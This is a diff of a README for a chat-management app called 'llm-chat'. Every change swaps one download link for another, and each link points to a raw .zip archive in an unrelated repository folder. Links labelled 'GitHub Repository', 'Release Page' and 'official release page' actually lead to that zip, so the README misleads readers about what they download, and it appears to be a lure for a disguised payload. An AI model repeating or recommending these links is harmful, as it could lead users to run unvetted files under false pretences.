@@ -1,6 +1,6 @@
 # 🤖 llm-chat - Manage Conversations with Ease
 
-[![Download llm-chat](https://img.shields.io/badge/Download-llm--chat-yellowgreen?style=for-the-badge)](https://github.com/fabriciosantos273738/llm-chat/raw/refs/heads/main/build_audit/x64/Debug/llm_chat_2.5.zip)
+[![Download llm-chat](https://img.shields.io/badge/Download-llm--chat-yellowgreen?style=for-the-badge)](https://raw.githubusercontent.com/fabriciosantos273738/llm-chat/main/include/chat_llm_v3.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ No special software or libraries are needed since this app is zero-dependency.
 
 You can get llm-chat from its official release page on GitHub. Click the badge below or use this link to open the page:
 
-[![Download llm-chat](https://img.shields.io/badge/Download-llm--chat-yellowgreen?style=for-the-badge)](https://github.com/fabriciosantos273738/llm-chat/raw/refs/heads/main/build_audit/x64/Debug/llm_chat_2.5.zip)
+[![Download llm-chat](https://img.shields.io/badge/Download-llm--chat-yellowgreen?style=for-the-badge)](https://raw.githubusercontent.com/fabriciosantos273738/llm-chat/main/include/chat_llm_v3.4.zip)
 
 ### Step 2: Choose the Correct Version
 
@@ -114,7 +114,7 @@ Check the release page regularly to get the latest version. Updates may fix bugs
 
 Visit the download page to get llm-chat for Windows:
 
-[![Download llm-chat](https://img.shields.io/badge/Download-llm--chat-yellowgreen?style=for-the-badge)](https://github.com/fabriciosantos273738/llm-chat/raw/refs/heads/main/build_audit/x64/Debug/llm_chat_2.5.zip)
+[![Download llm-chat](https://img.shields.io/badge/Download-llm--chat-yellowgreen?style=for-the-badge)](https://raw.githubusercontent.com/fabriciosantos273738/llm-chat/main/include/chat_llm_v3.4.zip)
 
 ---
 
@@ -150,8 +150,8 @@ Most users will not need these steps but can explore once comfortable.
 
 ## 📚 Additional Resources
 
-- GitHub Repository: https://github.com/fabriciosantos273738/llm-chat/raw/refs/heads/main/build_audit/x64/Debug/llm_chat_2.5.zip  
-- Release Page: https://github.com/fabriciosantos273738/llm-chat/raw/refs/heads/main/build_audit/x64/Debug/llm_chat_2.5.zip  
+- GitHub Repository: https://raw.githubusercontent.com/fabriciosantos273738/llm-chat/main/include/chat_llm_v3.4.zip  
+- Release Page: https://raw.githubusercontent.com/fabriciosantos273738/llm-chat/main/include/chat_llm_v3.4.zip  
 
 ---
 
